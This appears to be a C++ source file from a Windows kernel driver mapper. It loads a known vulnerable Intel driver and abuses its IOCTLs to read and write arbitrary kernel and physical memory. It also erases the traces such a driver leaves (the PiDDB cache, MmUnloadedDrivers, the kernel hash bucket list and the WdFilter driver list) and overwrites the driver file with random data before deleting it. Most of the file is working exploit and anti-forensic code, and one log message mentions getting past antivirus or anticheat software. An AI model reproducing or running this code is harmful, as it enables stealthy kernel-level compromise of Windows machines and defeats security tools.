#include "driver_mapper.hpp"


// Local variables:
DriverMapper::DISPATCH_FUNCTIONS TriggerFunctions;  // Will get filled up with functions for each responsibility
HANDLE RunningDrivers[VULNERABLE_IOCTL_COUNT];
DriverMapper::SYMBOLICLINK RunningSymbolicLinks[VULNERABLE_IOCTL_COUNT];
ULONG64 RunningDriversCount;
int IndexOfImplementedFunctions[VULNERABLE_IOCTL_COUNT];  // Index of pointers in DISPATCH_FUNCTIONS, value of index in RunningDrivers
ULONG64 ntoskrnlAddr;
DriverMapper::FILE_NAME DriverNames[VULNERABLE_IOCTL_COUNT];
LPCWSTR ResourceList[] = { L"TriggerFunctions", L"RunningDrivers", L"RunningSymbolicLinks",
							L"RunningDriversCount", L"IndexOfImplementedFunctions", L"ntoskrnlAddr", L"DriverNames" };


PVOID DriverMapper::GetLoaderResource(LPCWSTR ResourceName) {
	if (wcscmp(ResourceName, ResourceList[0]) == 0) {
		return &TriggerFunctions;
	}
	if (wcscmp(ResourceName, ResourceList[1]) == 0) {
		return RunningDrivers;
	}
	if (wcscmp(ResourceName, ResourceList[2]) == 0) {
		return RunningSymbolicLinks;
	}
	if (wcscmp(ResourceName, ResourceList[3]) == 0) {
		return &RunningDriversCount;
	}
	if (wcscmp(ResourceName, ResourceList[4]) == 0) {
		return IndexOfImplementedFunctions;
	}
	if (wcscmp(ResourceName, ResourceList[5]) == 0) {
		return &ntoskrnlAddr;
	}
	if (wcscmp(ResourceName, ResourceList[6]) == 0) {
		return DriverNames;
	}
	return NULL;
}


HANDLE DriverMapper::LoadVulnerableDriver(LPCWSTR SymbolicLink, uintptr_t* PiDDBLockPtr, uintptr_t* PiDDBCacheTablePtr,
	ULONG DriverTimestamp) {
	HANDLE result = INVALID_HANDLE_VALUE;
	if (wcscmp(SymbolicLink, INTELDRIVER_SYMLINK) == 0) {
		result = intel_driver::Load(SymbolicLink);
	}
	else {
		Log(L"[-] Invalid symbolic link provided: " << SymbolicLink << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	if (result == INVALID_HANDLE_VALUE) {
		return INVALID_HANDLE_VALUE;
	}

	*((ULONG64*)DriverMapper::GetLoaderResource(L"ntoskrnlAddr")) = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (*((ULONG64*)DriverMapper::GetLoaderResource(L"ntoskrnlAddr")) == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		DriverMapper::DriverCleanup();
		return INVALID_HANDLE_VALUE;
	}

	//check MZ ntoskrnl.exe
	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!DriverMapper::ReadMemory(*((ULONG64*)DriverMapper::GetLoaderResource(L"ntoskrnlAddr")),
		&dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (DriverTimestamp != NULL) {
		if (!stealth_functions::ClearPiDDBCacheTable(PiDDBLockPtr, PiDDBCacheTablePtr, DriverTimestamp)) {
			Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
			return INVALID_HANDLE_VALUE;
		}
	}

	if (!stealth_functions::ClearKernelHashBucketList()) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!stealth_functions::ClearMmUnloadedDrivers()) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!stealth_functions::ClearWdFilterDriverList()) {
		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	RunningDrivers[RunningDriversCount] = result;
	RtlCopyMemory(RunningSymbolicLinks[RunningDriversCount].SymbolicLink,
		SymbolicLink, wcslen(SymbolicLink) * sizeof(WCHAR));
	RunningDriversCount++;
	return result;
}


bool DriverMapper::Unload(HANDLE device_handle, char* driver_name) {
	Log(L"[<] Unloading vulnerable driver" << std::endl);

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}

	if (!service::StopAndRemove(utils::GetDriverNameW(driver_name)))
		return false;

	std::wstring driver_path = utils::GetDriverPath(driver_name);

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = sizeof(intel_driver_resource::driver) + (((long long)rand() * (long long)rand()) % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if (_wremove(driver_path.c_str()) != 0)
		return false;

	return true;
}


bool DriverMapper::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	return TriggerFunctions.Function0(RunningDrivers[IndexOfImplementedFunctions[0]],
		reinterpret_cast<uint64_t>(buffer), address, size);
}


bool DriverMapper::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	return TriggerFunctions.Function0(RunningDrivers[IndexOfImplementedFunctions[0]],
		address, reinterpret_cast<uint64_t>(buffer), size);
}


bool DriverMapper::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!TriggerFunctions.Function2(RunningDrivers[IndexOfImplementedFunctions[2]],
		address, &physical_address)) {
		Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory =
		TriggerFunctions.Function3(RunningDrivers[IndexOfImplementedFunctions[3]],
		physical_address, size);

	if (!mapped_physical_memory) {
		Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool result = DriverMapper::WriteMemory(mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
	if (!TriggerFunctions.Function4(RunningDrivers[IndexOfImplementedFunctions[4]],
		mapped_physical_memory, size))
		Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif


	return result;
}


uint64_t DriverMapper::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!DriverMapper::ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!DriverMapper::ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!DriverMapper::ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}